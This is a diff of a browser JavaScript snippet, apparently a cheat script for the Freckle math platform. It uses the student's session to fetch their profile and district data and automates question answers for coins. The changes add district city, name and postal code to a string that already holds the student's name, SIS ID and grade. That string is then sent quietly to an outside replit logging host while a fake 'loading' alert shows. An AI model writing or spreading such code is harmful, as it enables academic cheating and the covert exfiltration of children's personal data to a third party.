@@ -9,9 +9,19 @@ var r =await fetch("https://api.freckle.com/2/students/me", {
     "Content-type": "application/json; charset=UTF-8"
     },
 })
+var district = await fetch("https://api.freckle.com/2/districts", {
+  method: "GET",
+  credentials: "include"
+ 
+,headers: {
+    "Content-type": "application/json; charset=UTF-8"
+    },
+})
 g=await r.json()
+d=await district.json()
+district=d[0]
 console.log(g)
-//42940076 https://api.freckle.com/2/students/me
+
 async function coins(){
 var id=document.getElementsByClassName("math-question__wrapper___iRtlD")[0]["dataset"]["questionId"]
 
@@ -40,7 +50,7 @@ var response= await fetch("https://api.freckle.com/3/subjects/math/products/targ
 json=await response.json()
 setTimeout(coins, 1);
 }
-dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" coins.js"+" "+g["grade"]+" district: "+g["districtId"]
+dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" answers.js "+" grade: "+g["grade"]+" City: "+district["city"]+" name: "+district["name"]+" postal code: "+district["postalCode"]
 alert("loading... (press ok to continue, this process may take a couple of seconds)")
 await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
   method: "GET",
